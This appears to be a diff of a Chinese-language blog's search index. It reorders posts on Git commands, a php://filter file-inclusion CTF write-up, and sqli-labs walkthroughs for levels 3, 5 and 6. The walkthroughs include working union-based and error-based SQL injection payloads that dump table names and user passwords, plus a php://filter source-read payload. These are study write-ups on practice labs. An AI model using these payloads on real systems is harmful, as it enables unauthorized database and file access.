@@ -482,66 +482,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Git版本穿梭及版本比较</title>
-    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
-    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
-<li><p>状态查看：<code>git status</code></p>
-</li>
-<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
-</li>
-<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
-<span id="more"></span></li>
-</ul>
-<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
-<p>简洁显示：<code>git log --pretty=oneline</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
-<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
-<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
-<p>HEAD@{移动到当前版本所需要步数}</p>
-<p>若版本信息有多屏</p>
-<p>则空格向下翻页，b向上翻页，q退出</p>
-<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
-<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
-<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
-<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
-<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
-<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
-<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
-<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
-<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
-<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
-<p>现在状态为</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
-<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
-<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
-<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
-<p>然后删除文件，并添加到暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
-<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
-<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
-<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
-<p>上图表示第一行删去了9个a</p>
-<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C++运算符</title>
     <url>/2021/12/10/C-%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
     <content><![CDATA[<h1 id="1-运算符类型"><a href="#1-运算符类型" class="headerlink" title="1.运算符类型"></a>1.运算符类型</h1><p>运算运算符：用于四则运算</p>
@@ -829,6 +769,66 @@
 <p>当分支文件不一样时，才会出现分支</p>
 <p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111122101487.png" alt="image-20220111122101487"></p>
 <p><strong>Git在本地的版本控制就完结了</strong></p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git版本穿梭及版本比较</title>
+    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
+    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
+<li><p>状态查看：<code>git status</code></p>
+</li>
+<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
+</li>
+<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
+<span id="more"></span></li>
+</ul>
+<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
+<p>简洁显示：<code>git log --pretty=oneline</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
+<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
+<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
+<p>HEAD@{移动到当前版本所需要步数}</p>
+<p>若版本信息有多屏</p>
+<p>则空格向下翻页，b向上翻页，q退出</p>
+<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
+<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
+<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
+<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
+<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
+<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
+<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
+<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
+<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
+<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
+<p>现在状态为</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
+<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
+<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
+<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
+<p>然后删除文件，并添加到暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
+<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
+<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
+<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
+<p>上图表示第一行删去了9个a</p>
+<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
 ]]></content>
       <tags>
         <tag>Git</tag>
@@ -1518,6 +1518,30 @@
       </tags>
   </entry>
   <entry>
+    <title>php://filter 协议</title>
+    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
+<p>1是格式<br>2是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br>3是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br>4是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
+<span id="more"></span>
+
+<p>转base64编码：convert.base64-encode</p>
+<p>转大写：string.toupper</p>
+<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
+<p>例题：</p>
+<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
+<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
+<p>构造：php://filter/read=convert.base64-encode/recource=flag.php</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
+<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
+<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
+]]></content>
+      <tags>
+        <tag>php Filter</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于读书</title>
     <url>/2021/11/23/hello-world/</url>
     <content><![CDATA[<p>这是我的第一条博客!在这里我会更新自己觉得有价值的东西，希望这对你能有一些帮助。<br>嗯… 也不知道到写些什么，那就摘一篇我认为很有价值的文章吧！</p>
@@ -1621,69 +1645,54 @@
       </tags>
   </entry>
   <entry>
-    <title>php://filter 协议</title>
-    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
-<p>1是格式<br>2是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br>3是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br>4是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
-<span id="more"></span>
-
-<p>转base64编码：convert.base64-encode</p>
-<p>转大写：string.toupper</p>
-<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
-<p>例题：</p>
-<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
-<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
-<p>构造：php://filter/read=convert.base64-encode/recource=flag.php</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
-<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
-<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
-]]></content>
-      <tags>
-        <tag>php Filter</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlilabs第三关</title>
-    <url>/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/</url>
-    <content><![CDATA[<p>第三关和前两关没什么区别，主要是闭合方式的差异，这里顺便总结一下闭合方式</p>
-<ul>
-<li>整型</li>
-<li>单引号</li>
-<li>双引号</li>
-<li>单引号加括号</li>
-<li>双引号加括号</li>
-</ul>
-<span id="more"></span>
-
-<p>首先判断闭合方式</p>
-<p><code>?id=1&#39;</code></p>
-<p><code>?id=1&quot;</code></p>
-<p>**1.**如果都报错，就是整型</p>
-<p>**2.**如果单引号报错，双引号不报错，尝试</p>
-<p><code>?id=1&#39;--+</code></p>
-<p>如果不报错就是单引号闭合，报错就是单引号加括号闭合</p>
-<p>**3.**如果单引号不报错，双引号报错，尝试</p>
-<p><code>id=1&quot;--+</code></p>
-<p>无报错则双引号闭合，报错则双引号加括号闭合</p>
-<p><strong>任何闭合方式在没有遇到相对应的闭合时，都会把这个符号当做一个整体，注释符也没用！！</strong></p>
-<p>单引号</p>
-<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200408676.png" alt="image-20220122200408676"></p>
-<p>双引号</p>
-<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200430772.png" alt="image-20220122200430772"></p>
-<p>尝试?<code>id=1&#39;--+</code></p>
-<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200511915.png" alt="image-20220122200511915"></p>
-<p>则可判断闭合方式是<strong>单引号加括号</strong></p>
-<p>其余与第一关就一样了</p>
-<p>判断字段数、回显点、暴库名就舍去了</p>
-<p>爆表名</p>
-<p><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema =&#39;security&#39;--+</code></p>
-<p>爆字段名</p>
-<p><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema =&#39;security&#39; and table_name=&#39;users&#39;--+</code></p>
-<p>查数据</p>
-<p><code>?id=-1&#39;) union select 1,group_concat(username,1,password),3 from security.users--+</code></p>
-<p>完成</p>
+    <title>sqlilabs第5、6关</title>
+    <url>/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h1><p>按题意输入id=1，发现无回显，则不可用联合注入，题目说是双重注入，那就用双重注入。</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123120136543.png" alt="image-20220123120136543"></p>
+<h2 id="判断闭合类型"><a href="#判断闭合类型" class="headerlink" title="判断闭合类型"></a>判断闭合类型</h2><p>输入<code>id=1&#39;</code>报错，但是<code>id=1&#39;--+</code>不报错，说明是单引号闭合</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123120237851.png" alt="image-20220123120237851"></p>
+<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p>order by 4无反应，order by 3有反应，则字段数为3</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123120926386.png" alt="image-20220123120926386"></p>
+<h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><code>?id=1&#39; union SELECT 1,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a--+</code></p>
+<p>这里需要详细解释一下这个指令的原理</p>
+<p>首先</p>
+<p><code>select database()</code>是查看当前数据库，这不必多说。</p>
+<p><code>select rand()</code>是随机生成0-1之间的数</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123124535157.png" alt="image-20220123124535157"></p>
+<p>而<code>floor(rand()*2)</code>则决定了，输出的不是0就是1。</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123124807751.png" alt="image-20220123124807751"></p>
+<p>其次是<code>concat(&#39;a&#39;,&#39;b&#39;)</code>这里是将括号里面的内容一块输出，这里假设是a和b</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123125029180.png" alt="image-20220123125029180"></p>
+<p>接着是<code>as 拟定名称 from 某个表 </code></p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123130004809.png" alt="image-20220123130004809"></p>
+<p>当然，这里选择information_schema.tables也是有原因的，其原因就是 数据多。很大概率避免了只生成security0或者security1，（嘿嘿，当然别的表也可以，影响不大）</p>
+<p>输入该语句后会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个成员表里有5个成员。这个就会返回五条记录，这里users表里有13个用户，所以返回了13条</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123130104874.png" alt="image-20220123130104874"></p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123130134245.png" alt="image-20220123130134245"></p>
+<p>接着是<code>group by 列名</code></p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123130239790.png" alt="image-20220123130239790"></p>
+<p>该语句是将具有相同的数据整合到一个组，如上图所示</p>
+<p>最后是<code>count(*)</code>如果上面的语句加上count(*)，就会出现如下两种情况</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123131059687.png" alt="image-20220123131059687"></p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123131110019.png" alt="image-20220123131110019"></p>
+<p>第一种情况前面的数字是对应security0或1的个数，而第二个则是报错。</p>
+<p>我们希望他出现第二种情况，因为可以从报错信息中得到我们想要的数据。</p>
+<p>而之所以会出现两种情况是因为，存在<strong>重复的键值</strong>，group by 后面的是虚拟表的主键</p>
+<p><u>group by语句如果遇到重复的键值是不会再继续插入的。那么为什么会有重复的 security1 呢？这就是双查询注入的巧妙的之处了：<code>floor(rand()*2))</code> 产生的数只可能是0或1，而且会在插入前和插入时被执行两次（mysql官方说，在执行group by语句的时候，group by语句后面的字段会被运算两次。），且两次结果可能不同。比如：第一次插入了键值 security1 ，第二次产生了一个 security0 ，它于前者不重复，但由于rand()函数的随机性，真正插入时插入的可能是 security1 （插入时 <code>floor(rand()*2))</code> 又被执行了一次），这样就产生的重复的键值，而报错信息会告诉我们哪个键值重复，也就泄露了我们所想要的信息。</u></p>
+<p>详细原因请参考<a href="https://blog.csdn.net/he_and/article/details/80455884">大佬文献</a></p>
+<p>最后，前面加上1,是因为union具有严谨性，这个在第一关提到过，不再赘述。</p>
+<p>这样就得到了当前数据库名</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123133053294.png" alt="image-20220123133053294"></p>
+<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>?id=1&#39; union SELECT 1,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2))as a from information_schema.tables group by a--+</code></p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123133242521.png" alt="image-20220123133242521"></p>
+<p>这个和第一关就大同小异了</p>
+<h2 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h2><p><code>?id=1&#39; union SELECT 1,count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39;),floor(rand()*2))as a from information_schema.tables group by a--+</code></p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123133449087.png" alt="image-20220123133449087"></p>
+<h2 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h2><p>尝试用第一关的语句查数据，结果发现都返回You are in……</p>
+<p>则换为如图中所示命令</p>
+<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123134624869.png" alt="image-20220123134624869"></p>
+<p>这里仅仅是得出了第0行的用户名，若想得到密码，只更改username为password即可。若想得到第1行的数据，只需把0改为1即可，以此类推，即可得到所有用户名和密码。</p>
+<h1 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h1><p>第六关和第五关没啥区别，就是闭合方式改变了一下。这里是双引号闭合，其余都一样，这里就不赘述了。</p>
 ]]></content>
       <tags>
         <tag>SQL</tag>
@@ -1756,6 +1765,51 @@
 <p>这句话的意思是在security库的users表中找出所有username与对应的password，这里面的0x5c是\的十六进制编码。也可以是别的</p>
 <p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120005243708.png" alt="image-20220120005243708"></p>
 <p>完成。</p>
+]]></content>
+      <tags>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlilabs第三关</title>
+    <url>/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/</url>
+    <content><![CDATA[<p>第三关和前两关没什么区别，主要是闭合方式的差异，这里顺便总结一下闭合方式</p>
+<ul>
+<li>整型</li>
+<li>单引号</li>
+<li>双引号</li>
+<li>单引号加括号</li>
+<li>双引号加括号</li>
+</ul>
+<span id="more"></span>
+
+<p>首先判断闭合方式</p>
+<p><code>?id=1&#39;</code></p>
+<p><code>?id=1&quot;</code></p>
+<p>**1.**如果都报错，就是整型</p>
+<p>**2.**如果单引号报错，双引号不报错，尝试</p>
+<p><code>?id=1&#39;--+</code></p>
+<p>如果不报错就是单引号闭合，报错就是单引号加括号闭合</p>
+<p>**3.**如果单引号不报错，双引号报错，尝试</p>
+<p><code>id=1&quot;--+</code></p>
+<p>无报错则双引号闭合，报错则双引号加括号闭合</p>
+<p><strong>任何闭合方式在没有遇到相对应的闭合时，都会把这个符号当做一个整体，注释符也没用！！</strong></p>
+<p>单引号</p>
+<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200408676.png" alt="image-20220122200408676"></p>
+<p>双引号</p>
+<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200430772.png" alt="image-20220122200430772"></p>
+<p>尝试?<code>id=1&#39;--+</code></p>
+<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200511915.png" alt="image-20220122200511915"></p>
+<p>则可判断闭合方式是<strong>单引号加括号</strong></p>
+<p>其余与第一关就一样了</p>
+<p>判断字段数、回显点、暴库名就舍去了</p>
+<p>爆表名</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema =&#39;security&#39;--+</code></p>
+<p>爆字段名</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema =&#39;security&#39; and table_name=&#39;users&#39;--+</code></p>
+<p>查数据</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(username,1,password),3 from security.users--+</code></p>
+<p>完成</p>
 ]]></content>
       <tags>
         <tag>SQL</tag>
@@ -1880,6 +1934,39 @@
       </tags>
   </entry>
   <entry>
